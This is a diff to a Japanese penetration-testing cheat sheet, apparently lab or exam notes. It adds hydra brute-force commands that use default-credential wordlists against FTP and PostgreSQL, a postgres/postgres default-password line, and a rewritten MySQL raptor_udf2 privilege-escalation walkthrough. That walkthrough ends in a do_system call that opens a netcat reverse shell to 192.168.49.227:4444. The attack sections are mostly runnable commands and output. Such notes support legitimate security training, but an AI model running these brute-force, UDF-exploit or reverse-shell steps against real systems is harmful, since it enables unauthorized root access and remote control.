@@ -87,6 +87,28 @@ kali@kali:~$ sudo masscan -p80 10.0.0.0/8
 |  put (ローカルファイル名) (リモートファイル名)  | パソコンのファイルをサーバに転送。 |
 |  type (転送モード)  |  	現在のファイル転送モードを表示。  |
 
+下記のように止まってしまった場合、
+```
+ftp> ls
+229 Entering Extended Passive Mode (|||56201|)
+...
+```
+passiveコマンドを入力することで解消される。
+```
+ftp> passive
+Passive mode: off; fallback to active mode: off.
+ftp> ls
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
+drwxr-xr-x    2 1001     0            4096 May 26  2020 css
+drwxr-xr-x    3 1001     0            4096 May 26  2020 img
+-rw-r--r--    1 1001     0           23364 May 27  2020 index.php
+drwxr-xr-x    2 1001     0            4096 May 26  2020 js
+drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
+226 Directory send OK.
+```
+
 ## SSH(22)
 ### SCP
 カレントディレクトリにsecret.zipをダウンロード
@@ -1590,6 +1612,11 @@ psql -h 192.168.227.47 -p 5437 -U postgres
 - -p...ポートの指定
 
 ```
+# defaults password
+postgres/postgres
+```
+
+```
 # PostgreSQL ディレクトリの一覧
 postgres=# select pg_ls_dir('./');
 
@@ -1967,6 +1994,7 @@ https://hashcat.net/wiki/doku.php?id=rule_based_attack
 - -L...ユーザーリストファイルの指定
 - -p...単一のパスワードの指定
 - -P...パスワードファイルの指定
+- -C...username:passwordの辞書を指定
 - -s...カスタムポート(sshが22番以外のポートで使用されている時や、https/443を調べる場合に使用)
 - -f...ログインとパスワードの組み合わせが少なくとも1つ見つかったら終了
 - -V...各試行のログインとパスワードを表示(実行中の試行の様子が確認できる)
@@ -1988,7 +2016,8 @@ hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form 
 
 ### FTP
 ```
-hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 ftp
+hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.1 ftp
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.227.56 ftp
 ```
 
 ### SSH
@@ -1999,6 +2028,11 @@ hydra -f -l <user> -P /usr/share/wordlists/rockyou.txt 10.10.10.1 -t 4 ssh
 ### MySQL
 ```
 hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 mysql
+```
+
+### PostgreSQL
+```
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt 192.168.227.56 postgres
 ```
 
 ### SMB
@@ -2186,35 +2220,49 @@ export TERM=xterm-256color
 stty rows <num> columns <cols>
 ```
 
-## Service Exploits(MySQL)
-MySQLがrootとして実行されており、rootユーザーにパスワードが割り当てられていない時、以下のエクスプロイトを使用することでroot権限を取得することができる。  
-https://www.exploit-db.com/exploits/1518
+## MySQL raptor_udf2.c
+MySQLがrootとして実行されている場合に、mysqlに接続することができればroot権限を取得できる。  
+https://www.exploit-db.com/exploits/1518  
 まずは、raptor_udf2.cエクスプロイトコードをコンパイルする。
 ```
-cd /tmp
-gcc -g -c raptor_udf2.c -fPIC
+# ターゲットマシンの任意のディレクトリにraptor_udf2.cを配置する。
+  ただし/tmpに配置すると、後のcreate function do_systemでエラーが出てしまうため、ここでは/dev/shmに配置する。
+  /dev/shmでもエラーが出てしまう場合は、/var/wwwなどで試す。
+cd /dev/shm
+gcc -g -c raptor_udf2.c
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 ```
-空白のパスワードを使用してrootユーザーとしてMySQLサービスに接続する。
 ```
-mysql -u root
+mysql -u root -p
 ```
 MySQLのシェルで以下のコマンドを実行して、コンパイルされたエクスプロイトを使用してユーザ定義関数(UDF)「do_system」を作成する。
 ```
 use mysql;
 create table foo(line blob);
-insert into foo values(load_file('/tmp/raptor_udf2.so'));
+insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
+```
+
+plugin_dirを調べてValueに入っているパス(/usr/lib/mysql/plugin/)をメモする。
+```
+mysql> show variables like '%plugin%';
++-------------------------------+------------------------+
+| Variable_name                 | Value                  |
++-------------------------------+------------------------+
+| default_authentication_plugin | mysql_native_password  |
+| plugin_dir                    | /usr/lib/mysql/plugin/ |
++-------------------------------+------------------------+
+```
+上記でメモしたパスを指定して、下記のコマンドを実行する。
+```
 select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
 create function do_system returns integer soname 'raptor_udf2.so';
 ```
-この関数を使用して/bin/bashを/tmp/rootbashにコピーして、SUID権限を設定する。
+
+コマンドの実行に成功したら、do_system関数を利用してreverse shellを張る。
 ```
-select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+select do_system('/bin/nc 192.168.49.227 4444 -e /bin/bash');
 ```
-MySQLシェルを終了して下記のコマンドを入力する。
-```
-/tmp/rootbash -p
-```
+
 ## Weak File Permissions - Readable /etc/shadow
 /etc/shadowファイルにはユーザーパスワードハッシュが記述されている。  
 通常はrootユーザーのみが読み取ることができるが、設定ミスなどにより一般ユーザーでも読み取り可能なことがある。  
